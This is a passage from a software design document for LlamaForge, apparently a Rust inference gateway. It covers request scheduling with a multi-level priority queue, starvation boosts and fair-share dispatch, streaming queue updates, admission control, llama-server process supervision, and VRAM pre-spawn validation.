    async fn chat_completion(
        &self,
        request: ChatCompletionRequest,  // internal type, not proto or JSON
    ) -> Result<Pin<Box<dyn Stream<Item = ChatCompletionChunk> + Send + 'static>>>;
    // Note: + 'static is required because the stream is returned across
    // async handler boundaries (axum/tonic). The implementation must take
    // ownership of all required state — no borrows from &self.
}

// gRPC handler: proto → internal → stream proto chunks
// HTTP handler: JSON → internal → stream SSE chunks
// Both call the same InferenceEngine implementation
```

> **Downstream endpoint: `/completion` (not `/v1/chat/completions`).** The `InferenceEngine` implementation translates ALL requests into `llama-server`'s **proprietary `/completion` endpoint** format, NOT the OpenAI-compatible `/v1/chat/completions` endpoint. This is a deliberate architectural choice for three reasons:
> 1. **`id_slot` injection for cache-aware slot pinning:** The `/completion` endpoint accepts the `id_slot` integer parameter, enabling LlamaForge to pin requests to specific slots for KV cache reuse (see Section 10.1). Setting `id_slot: -1` requests auto-assignment; setting a specific slot number directs the request to a cache-warm slot identified by the prompt prefix affinity algorithm (Section 10.3). The `/v1/chat/completions` endpoint does not support `id_slot`.
> 2. **Full control over chat template rendering:** By sending raw prompt text to `/completion`, LlamaForge applies the Jinja chat template itself (using the template definition from the server's config, rendered via `minijinja`), giving full control over system prompt boundaries, tool call formatting, and prefix caching hash computation. The `/v1/chat/completions` endpoint applies the template server-side, making these computations opaque.
> 3. **Grammar/constraint pass-through:** The `/completion` endpoint natively accepts `grammar` (GBNF) and other llama.cpp-specific parameters without translation.
>
> **Note on `id_task`:** `id_task` is an internal `llama-server` field — it is NOT a client-settable parameter. LlamaForge does not inject `id_task` into requests. Instead, `id_task` values are **observed** from `GET /slots` responses and correlated with LlamaForge requests via the `id_slot` assignment. See the `slot_dispatch_map` design in Section 8 (Request Lifecycle) for the correlation mechanism used in orphan slot recovery.
>
> The client-facing API endpoints (`/v1/chat/completions`, `/v1/completions`, `/v1/messages`) remain fully OpenAI/Anthropic-compatible — translation happens inside the `InferenceEngine`, invisible to clients.


### 5.2 Request Queue & Scheduler

The queue is the central nervous system of LlamaForge. Every inference request passes through it.

**Data Structure: Bucket-Based Multi-Level Priority Queue**

The queue is implemented as a **bucket-based multi-level priority queue** aligned with the fair share tiers, plus a `HashMap` for O(1) lookup by `request_id`. Each priority tier maps to a `BTreeMap<Reverse<u32>, VecDeque<QueuedRequest>>` keyed by `Reverse<effective_priority>` (descending priority order) with `VecDeque` values providing true FIFO tie-breaking for equal priorities. The scheduler iterates from the highest-priority non-empty bucket using model-aware dispatch (see below), with fair share enforced via Deficit Round Robin.

> **Why not `BinaryHeap`?** An earlier design used `BinaryHeap<QueuedRequest>` within each tier. This was replaced because `BinaryHeap::iter()` yields elements in the **arbitrary order of the underlying array** (level-order traversal of the implicit binary tree), NOT in sorted priority order. The model-aware dispatch algorithm (below) requires sorted iteration to peek-and-skip without destructive popping. `BTreeMap` provides correct sorted iteration via `.iter()` with zero additional allocation or rebuild cost. Additionally, `BinaryHeap` uses `Ord` comparison on `(priority, enqueued_at)` tuples, which gives **LIFO** tie-breaking on equal priorities (newest `DateTime` is "greatest"), violating FIFO fairness. The `BTreeMap<Reverse<u32>, VecDeque>` design provides FIFO natively: equal-priority requests are appended to the back of the same `VecDeque` and popped from the front.

The inner `BTreeMap` within each bucket ensures that the fine-grained `effective_priority` score (a continuous `u32` computed from base priority, requestor bonus, explicit override, and starvation boost) is actually used for ordering — not discarded by FIFO insertion. Without intra-tier ordering, a starvation boost from 600 to 650 would have no effect unless it crossed a tier boundary, making the priority math meaningless for ~75% of boosts. The outer `BTreeMap` provides O(log T) tier lookup (T = number of tiers, currently 4). Within each tier, the inner `BTreeMap` provides O(log K) insert, O(1) amortized front-peek via `.iter().next()`, and correct sorted iteration for the model-aware dispatch scanner.

```rust
use std::cmp::Reverse;
use std::collections::{BTreeMap, HashMap, VecDeque};

/// Each bucket is a BTreeMap keyed by Reverse<effective_priority> — highest priority first.
/// VecDeque values provide true FIFO ordering for requests with equal effective_priority.
/// The outer BTreeMap provides O(log T) tier lookup (T = number of tiers, currently 4).
/// Within each tier, the inner BTreeMap provides O(log K) insert and O(log K) peek/pop,
/// with correct sorted iteration via .iter() — unlike BinaryHeap::iter() which is unordered.
struct MultiLevelQueue {
    buckets: BTreeMap<PriorityTier, BTreeMap<Reverse<u32>, VecDeque<QueuedRequest>>>,
    index: HashMap<RequestId, (PriorityTier, u32)>,  // O(1) lookup: (tier, effective_priority) for cancellation/boost/re-keying
}

> **Concurrency Note:** `MultiLevelQueue` is protected by `std::sync::Mutex`, NOT `tokio::sync::Mutex`. The lock is held only for synchronous, non-blocking operations (heap insert, heap pop, tier promotion) and is NEVER held across `.await` boundaries. If the starvation boost scan needs to emit metrics or make gRPC calls, it must collect the data under the lock, release the lock, then perform async I/O. Using `tokio::sync::Mutex` here would risk deadlocking the scheduler if an `.await` inside the critical section yields to a task that also needs the queue lock (e.g., a concurrent request admission).
>
> The starvation boost scan (every 5 seconds) must NOT execute logarithmic computations inside the lock. The correct pattern is: (1) acquire the lock, (2) snapshot the list of request IDs and their current `enqueued_at` timestamps (a cheap `Vec<(RequestId, Instant)>` clone), (3) release the lock, (4) compute `ln(1 + wait_intervals)` for each request outside the lock, (5) re-acquire the lock and apply the computed boosts. This two-phase approach keeps the critical section to O(N) copies (fast, no allocations if pre-sized) rather than O(N) transcendental math operations that cause priority inversion on Tokio worker threads.

enum PriorityTier {
    Emergency,       // base 1000
    RealtimeChat,    // base 800
    Standard,        // base 400–600 (code_gen, code_review, summarization)
    Background,      // base 100–200 (background, backfill)
}
```

When the starvation boost promotes a request across a tier boundary, the scheduler removes it from its current bucket's inner `BTreeMap` (removing the request from the `VecDeque` at its old `Reverse<effective_priority>` key, and cleaning up the key if the `VecDeque` becomes empty) and inserts it into the target tier's `BTreeMap` at its new priority key. When the boost keeps the request within the same tier, the updated `effective_priority` requires a **remove-and-reinsert** cycle: the request is removed from the `VecDeque` at the old priority key (with key cleanup if empty), its priority is updated, and it is inserted into the `VecDeque` at the new `Reverse<new_priority>` key.

For the bulk starvation scan (every 5 seconds), the two-phase pattern described in the Concurrency Note above avoids per-element surgery during computation: (1) snapshot request IDs and timestamps under the lock, (2) compute boosts outside the lock, (3) re-acquire the lock and apply boosts. At apply time, if a snapshotted request is no longer present in the `index` (dispatched or cancelled between phase 1 and phase 3), it is skipped silently — no error, no log noise.

> **[G-9] Starvation boost TOCTOU fix:** Phase 3 (apply) MUST recompute the boost from the immutable `enqueued_at` timestamp at apply time, NOT use the pre-computed value from phase 2. The phase-2 computation uses `now` captured before the lock was released — by the time phase 3 re-acquires the lock, `now` may be stale by hundreds of milliseconds under contention. More critically, requests that arrive between phases 1 and 3 have their `enqueued_at` already stored in the queue; recomputing from `enqueued_at` at apply time ensures these new arrivals get correct boost calculation on the next cycle without needing to be in the phase-1 snapshot. The phase-2 step becomes a pre-filter only: it identifies which requests *might* need re-keying, but the authoritative boost value is always `f(now_at_apply, request.enqueued_at)`.
>
> **[AP-5] Queue mutex contention at scale:** For queue depths > 200 entries, the apply phase SHOULD be wrapped in `tokio::task::spawn_blocking` to avoid holding the Mutex across hundreds of microseconds of BTreeMap re-keying on a Tokio worker thread. At 200+ entries, the O(N log K) re-keying can exceed Tokio's cooperative scheduling budget (typically 128 operations), starving other tasks on the same worker. The `spawn_blocking` wrapper moves the entire lock-acquire + re-key + lock-release sequence to the blocking thread pool, freeing the Tokio worker immediately. This is expected during high-throughput periods and is not a correctness concern. For the apply step, each boosted request still present is individually re-keyed in the `BTreeMap` — **but only if the computed new priority differs from the current priority**. If `new_priority == current_priority`, the request is skipped to preserve its FIFO position within the VecDeque. Without this guard, the remove-and-reinsert cycle would move the request to the *back* of its VecDeque, destroying arrival ordering for same-priority requests. When the priority does change, the `index` provides the request's current `(PriorityTier, effective_priority)` in O(1), enabling direct O(log K) lookup into the correct tier's `BTreeMap` at the exact `Reverse<old_priority>` key. The request is then removed from the `VecDeque` at that key, inserted into the `VecDeque` at the updated `Reverse<new_priority>` key (O(log K) BTreeMap lookup for the destination), and the `index` entry is updated to reflect the new `(tier, priority)`. Cross-tier promotions are handled identically — remove from source tier's `BTreeMap`, insert into target tier's `BTreeMap`, update the `index` entry's tier component.

**Complexity analysis:** Each re-key involves: O(1) index lookup + O(log K) BTreeMap find for the old key + **O(D) VecDeque removal** (where D is the number of requests sharing the exact same `effective_priority` at that key) + O(log K) BTreeMap find/insert for the new key + O(1) VecDeque push_back. The VecDeque removal is O(D), not O(1), because `VecDeque::remove(index)` shifts elements to close the gap. For N boosted requests, the total cost is **O(N · (log K + D))**.

In practice, D is small: `effective_priority` is a `u32` computed from `base_priority + starvation_boost + config_boost`, and the starvation boost increments by 1 per 5-second tick per request. Requests that entered the queue at different times rapidly diverge in priority, making exact collisions rare. With K priority tiers in the BTreeMap (typically 50-200 distinct priority values across all requests), D averages 1-3 requests per key. The dominant term is the O(log K) BTreeMap operations, making the practical cost O(N log K). If a pathological workload produces large D (hundreds of requests at identical priority), the linear VecDeque shift becomes the bottleneck — but at that scale, the operator should tune priority rules to differentiate requests.

> **Why not `HashMap` + `Vec::swap_remove` for O(1) removal?** `swap_remove` is O(1) but destroys insertion order. The `VecDeque` preserves FIFO order within a priority level — requests with identical priority are served in arrival order. Destroying this property would cause starvation for same-priority requests that happen to land at the end of the Vec.

> **Scale-aware design note:** At queue depths <100 (typical for v1 with 2–4 GPUs), a sorted `Vec<QueuedRequest>` with binary search insert and `Vec::remove()` for dispatch provides equivalent performance — O(N) with N<100 is effectively free. The BTreeMap design is chosen for correctness at 10x scale (queue depths 500–1000 across 16+ GPUs) without requiring a rewrite. For v1 implementers: if the BTreeMap nesting feels like unnecessary cognitive load, start with the sorted Vec and migrate when queue depths consistently exceed 100.

**Model-Aware Dispatch (No Head-of-Line Blocking):**

The scheduler does NOT blindly pop the highest-priority request. It **peeks and iterates** from highest to lowest priority across all buckets, checking each request against currently available capacity:

1. For each request R (in priority order), check if any server serving R's model has an available slot (using the `tracker.count()`-compensated slot count).
2. If yes, **record the dispatch coordinates** `(tier, Reverse<priority>, VecDeque index)` and break the iteration.
3. If no, skip R and continue to the next request.
4. A skipped request remains in the queue at its current position — it is not penalized for being model-blocked.
5. **After the iterator is dropped**, use the recorded coordinates to remove the request from the `BTreeMap`/`VecDeque` and dispatch it.

> **Rust aliasing constraint:** The scheduler cannot call `.remove()` on a `VecDeque` while holding an active `.iter()` reference to the `BTreeMap` — Rust's borrow checker prevents simultaneous `&` (from the iterator) and `&mut` (from the removal) borrows. The two-phase "yield coordinates, drop iterator, then remove" pattern satisfies the borrow checker while preserving the O(log K) lookup efficiency. The coordinates are lightweight stack values (an enum, a u32, and a usize index).

This prevents head-of-line blocking: a blocked request for Model A does not stall dispatch of a lower-priority request for Model B that has idle slots. The scheduler is work-conserving with respect to both priority ordering and hardware utilization.

```
Priority Levels (computed):
┌──────────────────────────────────────────────────────────┐
│  if explicit_override is set:                            │
│    Effective Priority = explicit_override + starvation_boost │
│  else:                                                   │
│    Effective Priority = base_priority(task_type)          │
│                       + requestor_bonus                  │
│                       + starvation_boost                 │
└──────────────────────────────────────────────────────────┘

Task Type Base Priorities:
  emergency       = 1000
  realtime_chat   = 800
  code_review     = 600
  batch_analysis  = 400
  background      = 200
  backfill        = 100

Requestor Bonuses (configurable):
  ci-pipeline     = +100
  interactive-ui  = +50
  batch-worker    = +0
```

**Starvation Prevention (logarithmic boost + fair share):**

Every 5 seconds, the scheduler scans the queue and applies a **logarithmic** starvation boost to any request that has waited more than 30 seconds:

```
starvation_boost = min(boost_scale × ln(1 + wait_intervals), max_boost)

where:
  wait_intervals = (now - enqueued_at - 30s) / 5s
  boost_scale = 50 (configurable)
  max_boost = 400 (configurable)
```

This gives an aggressive initial boost that tapers off, preventing the "burst release" problem where many low-priority requests accumulate linear boosts and flood the system simultaneously when high-priority traffic subsides.

Additionally, a **fair share floor** guarantees that each priority tier receives a minimum percentage of throughput. The default allocation is:

| Tier | Min Share |
|------|-----------|
| emergency + realtime | 60% |
| standard (code_gen, code_review, summarization) | 30% |
| background + backfill | 10% |

The scheduler enforces fair share via **Deficit Round Robin (DRR)** — a work-conserving algorithm that never holds hardware slots idle. DRR operates at the **inter-tier** level (selecting which bucket to pop from), while `effective_priority` operates at the **intra-tier** level (sorting requests within a bucket). These two concerns are strictly decoupled — DRR never mutates `effective_priority`. **Division-by-zero guard:** `total_tokens == 0` would cause a division-by-zero in the actual share computation (`tier_tokens / total_tokens`). DRR falls back to **pure priority ordering** unconditionally whenever `total_tokens == 0` — not just during the first 60 seconds. This covers: (a) startup (no requests dispatched yet), (b) slow model loading (servers take 45+ seconds to become healthy, delaying first dispatch past t=60s), (c) traffic gaps (all sliding window entries expire after 60s of silence). The guard is a simple `if total_tokens == 0 { return pop_by_priority() }` check before any share computation — it has no time dependency:

- Each priority tier maintains a `deficit_tokens: u64` counter tracking the cumulative tokens dispatched to that tier over a sliding 60-second window.
- When selecting the next request to dispatch, the scheduler computes each tier's **actual share** (`tier_tokens / total_tokens`) over the window.
- If a tier's actual share is below its configured minimum, the DRR iterator visits that tier's bucket **first**, bypassing higher-priority buckets for that dispatch cycle. The request popped from the starved tier retains its original `effective_priority` — no score mutation occurs. This ensures `effective_priority` at dispatch time remains semantically meaningful for metrics, debugging, and audit.
- If a tier's queue has been **continuously empty for at least `window_size / 2`** (default: 30 seconds), its share allocation is redistributed proportionally to other tiers, **and its `deficit_tokens` counter is reset to its fair-share replenishment amount** (`target_share_pct × quantum_tokens`). **Critical: do NOT reset to zero** — in DRR, `deficit_tokens` tracks *remaining allowance* (higher = more budget). Setting to 0 means maximum debt: the tenant gets no service until the next full round replenishment. The correct reset gives the tier a fresh starting budget equal to its fair share, e.g., a 30% share of 4096 quantum tokens → `deficit_tokens = 1228`. Without this reset, a tier that was empty for 55 seconds accumulates a massive "historical debt" — when its first request arrives, the tier appears to have 0% actual share against a 30% target, causing DRR to override priority ordering for the next dozens of dispatches until the deficit is repaid. The grace period prevents the opposite problem: a tier that processes 30 requests, empties for 1 second between bursts, then receives 20 more requests should retain its sliding window history rather than resetting to zero on every momentary gap. Brief empty intervals (< `window_size / 2`) retain the existing `deficit_tokens` and sliding window history, preserving accurate share accounting across bursty workloads. No slot ever sits idle while requests are queued in any tier.

> **Design note (why not priority mutation):** An earlier design considered boosting `effective_priority` of starved-tier requests to force them above higher-tier requests. This was rejected because: (1) it destroys the semantic meaning of the priority score — a `Background` request with a boosted score of 850 is not meaningfully comparable to a `RealtimeChat` request at 850; (2) it corrupts metrics — `effective_priority` at dispatch time becomes a lie, making it impossible to reason about scheduling behavior from the audit log; (3) it requires re-keying entries in the intra-tier `BTreeMap` after mutation. DRR bucket-level selection achieves the same scheduling outcome without any of these costs.

This is strictly work-conserving: at full utilization, fair share percentages are respected as soft targets. At partial utilization, all capacity is available to whichever tier has demand. The "minimum share" configuration sets a floor, not a reservation.

> **Small Deployment Note:** For clusters with fewer than 10 total slots, DRR's sliding window is shortened to 30 seconds to increase responsiveness. The low-priority drain timer (one low-priority request every 30 seconds regardless of queue state) is retained as a safety net to prevent complete starvation even if the DRR window calculation is temporarily skewed.

**Queue Position Feedback:**

> **Multi-model caveat:** Queue position reflects priority ordering across all models, not guaranteed dispatch ordering. In multi-model deployments, requests targeting models with available capacity may be dispatched ahead of higher-priority requests for loaded models. `estimated_wait_secs` is best-effort, computed from recent throughput for the target model — it does not account for cross-model capacity shifts.

When a request enters the queue, the client receives an immediate response:

```json
{
  "status": "queued",
  "request_id": "01J5ABCDEF...",
  "queue_position": 3,
  "estimated_wait_secs": 12.5,
  "poll_url": "/api/queue/01J5ABCDEF..."
}
```

For streaming requests, the SSE stream stays open and sends queue position updates. The format is endpoint-dependent (see Compatibility Note in Section 7.2):

- **OpenAI endpoints** (`/v1/chat/completions`, `/v1/completions`): Queue updates are sent as empty-delta chunks with a `llamaforge` metadata key. No named SSE events.
- **Anthropic endpoint** (`/v1/messages`): Queue updates are sent as `event: ping` with a `llamaforge` extension object in the `data:` payload. The Anthropic SSE specification explicitly states that `ping` events can occur at **any point** in the stream and must be silently ignored by compliant state machines — making it the only safe vehicle for pre-generation metadata. (An earlier design used `event: message_delta`, which crashes all compliant Anthropic SDK clients: the protocol enforces a strict forward-only state machine `message_start → content_block_start → content_block_delta → ... → message_delta → message_stop`, and receiving `message_delta` before `message_start` triggers an immediate `ProtocolError`.)
- **gRPC**: Queue updates use the dedicated `QueueUpdate` message within the `oneof response_type` envelope.

**OpenAI SSE format:**

```
data: {"id":"...","object":"chat.completion.chunk","choices":[{"delta":{},"index":0}],"llamaforge":{"status":"queued","queue_position":3,"estimated_wait_secs":12.5}}

data: {"id":"...","object":"chat.completion.chunk","choices":[{"delta":{},"index":0}],"llamaforge":{"status":"queued","queue_position":1,"estimated_wait_secs":3.0}}

data: {"id":"...","object":"chat.completion.chunk","choices":[{"delta":{},"index":0}],"llamaforge":{"status":"processing","server_id":"srv-01","slot_id":2}}

data: {"id":"...","object":"chat.completion.chunk","choices":[{"delta":{"content":"Hello"},"index":0}]}
...
```

**Admission Control:**

The scheduler implements backpressure:

- **Hard queue limit:** Configurable max queue depth (default: 1000). Requests beyond this receive HTTP 429 with a `Retry-After` header.
- **Per-requestor limit:** Configurable max concurrent + queued requests per requestor (default: 50). Note: this controls concurrency, not resource consumption — a requestor can submit 50 high-`max_tokens` requests consuming far more GPU time than 50 short requests. Token-budget rate limiting is planned for v1.1. **Cooperative, not a security boundary:** The `requestor` field is client-supplied with no authentication — any client can set `requestor: "someone-else"` to bypass limits. This is acceptable for trusted internal deployments; for untrusted environments, enforce requestor identity at the API gateway or load balancer layer before traffic reaches LlamaForge.
- **Queue timeout:** Requests that exceed their `queue_timeout_secs` are evicted and the client receives a 408 (Request Timeout).


### 5.3 Server Manager (Process Lifecycle)

The Server Manager owns the lifecycle of all `llama-server` child processes.

> **Design choice: in-process supervision vs. external init systems.**
>
> LlamaForge manages `llama-server` processes directly via `tokio::process` rather than delegating supervision to systemd, Kubernetes, or Docker Compose. This is a deliberate tradeoff:
>
> **Why in-process (chosen):**
> - **Single-binary deployment.** LlamaForge's primary audience is individual developers and small teams running 2-4 GPUs. They download one binary, write one TOML file, and run it. Requiring systemd units, Docker Compose service definitions, or Kubernetes manifests for each llama-server instance adds operational complexity that is disproportionate at this scale.
> - **GPU-aware restart sequencing.** The Server Manager performs VRAM pre-spawn validation, staggered restarts to avoid thundering-herd VRAM contention, and exponential backoff — all of which require coordination across servers that share GPU resources. An external init system restarts processes independently, with no visibility into VRAM pressure or cross-server restart ordering.
> - **Sub-millisecond crash detection.** `tokio::process::Child::wait()` resolves the instant the child exits, providing exact exit code/signal classification. External health checks (systemd watchdog, Kubernetes liveness probes) operate on 10-30 second intervals, leaving a window where a crashed backend is still receiving routed requests.
> - **Zero-downtime config reload.** SIGHUP-triggered config changes can gracefully drain one server, modify its arguments, and restart it — all coordinated by the Server Manager without touching the deployment manifest.
>
> **Alternative: external init system + service discovery (rejected for v1, recommended for v2 multi-node):**
> Delegating process lifecycle to systemd/Kubernetes and discovering servers via DNS or a static topology file would eliminate the need for zombie reaping, SIGTERM/SIGKILL escalation, PID liveness checks, and the orphan process recovery protocol (Section 14). This is unambiguously the right architecture for multi-node deployments where llama-server instances run on different hosts. For v1 single-machine deployments, the operational simplicity of "one binary manages everything" outweighs the implementation complexity of the process manager. The Server Manager already records PIDs in SQLite for orphan recovery — the added complexity is bounded.
>
> **Alternative: per-server sidecar (rejected):**
> A lightweight Rust sidecar binary co-located with each `llama-server` that registers with the gateway via gRPC. This provides crash isolation (a sidecar crash doesn't take down the gateway) but doubles the number of managed processes, requires its own deployment pipeline, and introduces a distributed coordination problem (sidecar registration, heartbeating, deregistration) that is harder to get right than local process management. Overkill for 2-4 servers on one machine.
>
> **Migration path:** If LlamaForge moves to multi-node (Section 15), the Server Manager's interface (`start`, `stop`, `restart`, `health_check`) becomes a trait with two implementations: `LocalProcessManager` (current, for co-located servers) and `RemoteServerManager` (connects to pre-existing llama-server instances via HTTP, no process control). The config already supports `host` and `port` per server — pointing these to a remote address with `auto_restart = false` effectively opts into the external supervision model today.

**Server Instance Configuration (TOML):**

Each managed server is defined in the LlamaForge config file:

```toml
[servers.llama-8b-gpu0]
binary_path = "/usr/local/bin/llama-server"   # Path to the llama-server executable
model_path = "/models/llama-3.1-8B-Q4_K_M.gguf"
alias = "llama-3.1-8b"
host = "127.0.0.1"
port = 8081
model_architecture = "transformer"   # "transformer", "recurrent" (Mamba/RWKV), or "hybrid"
backend = "cuda"                     # "cuda", "metal", "vulkan", "rocm", "cpu"
devices = ["gpu:0"]                  # Abstract device list: "gpu:0", "gpu:1", "cpu", etc.
gpu_layers = 99
parallel_slots = 4
ctx_size = 8192
ctx_shift = true                     # Enable context shifting (default: true)
batch_size = 2048
ubatch_size = 512
cache_type_k = "q8_0"
cache_type_v = "q8_0"
flash_attn = "auto"                  # "auto" (default, backend decides), "on", or "off"
metrics_enabled = true
auto_restart = true
max_restart_attempts = 3
restart_cooldown_secs = 10
restart_on_degradation = false     # Auto-restart if TPS drops below 10% of rolling avg for 60s
estimated_vram_mb = 5500           # Conservative estimate for pre-spawn validation
mmproj_path = ""                   # Multimodal projector (optional)
image_min_tokens = 0               # Min tokens reserved for image processing (0 = auto)
image_max_tokens = 0               # Max tokens for image processing (0 = auto/unlimited)
draft_model_path = ""              # For speculative decoding (optional)
speculative_method = "none"        # "none", "draft", "eagle3", "ngram_simple", "ngram_lookup"
jinja = true                       # Enable Jinja templates (required for tool use)
rope_scaling = ""                  # RoPE scaling type (optional)
mlock = false                      # Pin model in RAM
no_mmap = false                    # Disable memory mapping
threads = -1                       # Generation threads (-1 = auto)
threads_batch = -1                 # Batch processing threads (-1 = auto)
cache_prompt = true                # Enable server-side prompt caching
slot_prompt_similarity = 0.5       # Threshold for prompt cache slot matching
shutdown_drain_timeout_secs = 0    # 0 = auto: max(60, min(ctx_size / 30, 600))
tls_cert_path = ""                 # TLS certificate for downstream server (empty = plain HTTP, v1 default for localhost)
tls_key_path = ""                  # TLS private key for downstream server (empty = plain HTTP)

# LoRA adapters loaded at server start. Per-request adapter selection is supported
# via the lora_adapter field in RequestMetadata.
# Name resolution: if `name` is omitted, it defaults to the filename stem (e.g.,
# "/models/adapters/finetune-v1.gguf" → "finetune-v1"). Requests match on the
# resolved name, not the file path. The management API exposes adapters by name.
[[servers.llama-8b-gpu0.lora_adapters]]
path = "/models/adapters/finetune-v1.gguf"
name = "finetune-v1"   # optional; defaults to filename stem if omitted
scale = 1.0

[servers.llama-8b-gpu0.environment]
CUDA_VISIBLE_DEVICES = "0"
```

**Backend Capability Matrix:**

The Server Manager's monitoring and validation features depend on backend-specific telemetry APIs. Not all backends provide equivalent capabilities. The following matrix documents what is available per backend and the degraded behavior when a capability is absent:

| Capability | CUDA (NVML) | Metal (IOKit/sysctl) | ROCm (rocm-smi-lib) | Vulkan | CPU |
|---|---|---|---|---|---|
| VRAM query | `nvmlDeviceGetMemoryInfo` | `sysctl hw.memsize` (unified) | `rsmi_dev_memory_usage_get` via `librocm_smi64.so` | `VK_EXT_memory_budget` (if supported by driver) | N/A |
| GPU utilization | `nvmlDeviceGetUtilizationRates` | IOKit (system-wide, not per-process) | `rsmi_dev_gpu_busy_percent` via rocm-smi-lib | N/A | N/A |
| Deadlock detection | 4-signal (full) | 4-signal (CPU fallback for condition 3) | 3-signal (no GPU util; condition 3 skipped) | 3-signal (no GPU util; condition 3 skipped) | 2-signal (process exit + decode stall only) |
| VRAM reservation | Full (NVML query) | Full (sysctl query) | Full (requires rocm-smi-lib installed) | Static estimate only (`estimated_vram_mb` from config) | N/A |
| Performance degradation | TPS from `/metrics` (all backends) | TPS from `/metrics` (all backends) | TPS from `/metrics` (all backends) | TPS from `/metrics` (all backends) | TPS from `/metrics` (all backends) |

**Degraded behavior by backend:**

- **ROCm:** Requires `rocm-smi-lib` (`librocm_smi64.so`) for VRAM and GPU utilization queries. The Rust interface uses FFI bindings to `rsmi_dev_memory_usage_get` (VRAM) and `rsmi_dev_gpu_busy_percent` (utilization). If rocm-smi-lib is not installed, VRAM reservation falls back to the static `estimated_vram_mb` config value (operator must set this accurately), GPU utilization is unavailable, and deadlock detection drops to 3 signals (process exit watch + decode stall + active work check — no GPU utilization threshold). A startup warning is logged: `"rocm-smi-lib not found; VRAM validation and GPU utilization monitoring disabled for ROCm backend"`.
- **Vulkan:** GPU telemetry is best-effort. VRAM queries depend on `VK_EXT_memory_budget` support, which varies by driver and GPU vendor. If the extension is unavailable, VRAM reservation falls back to the static `estimated_vram_mb` config value. GPU utilization is not available through Vulkan — deadlock detection relies on 3 signals (process exit watch + decode stall + active work check). Operators deploying on Vulkan should set `estimated_vram_mb` conservatively and monitor server health externally.
- **CPU:** No VRAM concept. VRAM reservation is skipped entirely. Deadlock detection uses only 2 signals: process exit watch and decode stall (no GPU utilization, no meaningful "active work" threshold since CPU inference doesn't have slot-level GPU occupancy). CPU backends are expected to be used for small models or testing — production GPU deployments should use CUDA, Metal, or ROCm.

**VRAM Pre-Spawn Validation:**

Before starting a `llama-server` process, the Server Manager performs a VRAM availability check to prevent OOM crashes and wasted startup time:

1. **Query free VRAM** via the backend-appropriate API: NVML for CUDA (the same library behind `nvidia-smi`), `sysctl` or IOKit for macOS/Metal, `rsmi_dev_memory_usage_get` for ROCm (requires rocm-smi-lib), or `VK_EXT_memory_budget` for Vulkan (if the extension is supported). If the backend's VRAM query is unavailable (rocm-smi-lib not installed, Vulkan extension missing), the validation falls back to comparing the static `estimated_vram_mb` config value against the last known VRAM state — or skips validation entirely with a warning if no VRAM data is available. CPU backends skip this step.
2. **Compute estimated VRAM need:**
   ```
   kv_cache_bytes = (k_bytes_per_element + v_bytes_per_element)
                  × num_kv_heads × head_dim × num_layers
                  × ctx_size

   estimated_vram_mb = model_size_mb
                     + kv_cache_bytes / 1048576
                     + overhead_mb
   ```
   Where `overhead_mb` accounts for CUDA/Metal context, scratch buffers, and compute graph (~300-500 MB typical). **Note:** `ctx_size` is NOT multiplied by `parallel_slots` because llama.cpp's `-c` flag specifies the **total** context across all slots. The per-slot context is `ctx_size / parallel_slots`. The KV cache is a single contiguous allocation of `ctx_size` total tokens, divided among slots internally by llama-server. The model architecture parameters (`num_kv_heads`, `head_dim`, `num_layers`) are extracted from GGUF metadata at startup — GGUF files encode these in the header as `llama.attention.head_count_kv`, `llama.embedding_length / llama.attention.head_count`, and `llama.block_count`. The `k_bytes_per_element` and `v_bytes_per_element` are derived from `cache_type_k` and `cache_type_v` respectively: `f16` = 2 bytes, `q8_0` = 1 byte, `q4_0` = 0.5 bytes. These types are configured independently per server (`cache_type_k` and `cache_type_v` in the server TOML), so the formula correctly handles mixed quantization (e.g., `cache_type_k = "q8_0"` at 1 byte + `cache_type_v = "f16"` at 2 bytes = 3 bytes per element, not the 4 bytes that a naive `× 2` multiplier would compute).
3. **Compare:** If `free_vram_mb < estimated_vram_mb`, the Server Manager:
   - **Warns** in the log and emits a `server_vram_insufficient` event.
   - **Refuses to start** the process, transitioning directly to `Failed` state with a descriptive error message (e.g., "Need ~5500 MB VRAM but only 3200 MB free on GPU 0").
   - The operator can override this check by setting `estimated_vram_mb` in the server TOML config, which replaces the computed estimate. This is useful when the heuristic is inaccurate (e.g., heavily quantized KV caches, partial offload).
4. **On success:** Proceed to the `Starting` state as normal.

This validation is coordinated through an internal **VRAM Reservation Ledger** (`Arc<Mutex<HashMap<GpuId, u64>>>`) that tracks logical VRAM allocations before physical allocation completes. The spawn sequence is:

1. **Acquire ledger lock** (synchronous — held only for the duration of the arithmetic, never across `.await` boundaries).
2. **Query free VRAM** via NVML/sysctl, then subtract any existing logical reservations for the same GPU from the ledger.
3. **Compare** effective free VRAM against `estimated_vram_mb`. If insufficient, reject immediately.
4. **Record reservation** in the ledger: `ledger[gpu_id] += estimated_vram_mb`.
5. **Release lock, then spawn** the `llama-server` process.
6. **Reconcile upward only — ledger persists for server lifetime:** The ledger is NOT reconciled immediately after the health check. CUDA and Metal use lazy memory allocation — the KV cache is not mapped into physical VRAM until the first inference request triggers a prefill. If NVML is queried at health-check time, it may report only model weight VRAM (e.g., 3GB), causing premature release. Instead:
   - The estimated reservation persists in the ledger **for the entire lifetime of the server process**. It is only removed when the server process exits (graceful shutdown, crash, or restart).
   - After first inference (detected by `n_decoded > 0` on any slot via `/slots` polling), query NVML for actual VRAM usage. Update the ledger entry to `MAX(NVML_reported_for_this_server, original_estimate)`. This catches underestimates but never reduces the reservation below the original estimate.
   - **Critical: NVML partial allocation trap.** With lazy KV cache allocation and multiple slots, NVML only reflects VRAM for actively-used slots. A 4-slot server with 1 active slot may show 5GB in NVML but actually need 7GB when all slots fill. The original estimate (which accounts for full ctx_size across all slots) is the correct worst-case reservation. The ledger MUST NOT be reduced below this estimate until the server exits.
   - **Effective free VRAM calculation:** `effective_free = NVML_free_vram` (no ledger subtraction for running servers). The ledger is used ONLY to prevent concurrent spawn races: `effective_free_for_spawn = NVML_free_vram - SUM(ledger entries for servers in spawn-to-healthy state)`. Servers that have passed health checks are already reflected in NVML's `used_vram` — their ledger entries exist solely to prevent the "ghost entries" problem (G-2) where idle servers appear to not exist in NVML.
   - **Idle server reconciliation (G-2 fix):** A server in `Running` state with `n_decoded == 0` for longer than 5 minutes (no traffic) triggers a reconciliation: query NVML, compare against the ledger entry. If NVML shows significantly less usage than the ledger (indicating lazy allocation hasn't occurred for unused slots), the ledger entry is retained at the original estimate — this is the correct worst-case. If the server truly has no allocation (e.g., model was never loaded successfully), the health check would have failed and the process would be in `Failed` state, triggering ledger removal.
   - If the process fails to start (health check never passes), remove the reservation from the ledger after the restart cooldown expires.
